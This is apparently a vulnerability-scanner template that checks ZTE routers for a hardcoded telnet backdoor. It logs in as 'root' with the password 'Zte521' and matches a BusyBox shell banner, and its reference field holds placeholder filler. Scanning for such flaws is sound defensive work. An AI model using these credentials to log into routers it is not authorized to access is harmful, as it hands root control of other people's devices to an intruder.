id: zte-backdoor

info:
  name: Backdoor in some ZTE routers.
  author: its0x08
  severity: high
  description: |
    Multiple ZTE routers have a telnet hardcoded backdoor account that spawns root shell.
  reference: |
    references go here!!!!!!!!!!!!!1
  tags: zte,backdoor,unauth,telnet,iot

network:
  - host:
      - "{{Hostname}}"
      - "{{Host}}:23"
    inputs:
      - data: "root\r\n"
      - data: "Zte521\r\n\r\n"
        read: 1024

    matchers:
      - type: word
        words:
          - "BusyBox"
    extractors:
      - type: regex
        regex:
          - '[A-Z]{1,}[0-9]{3,4}'
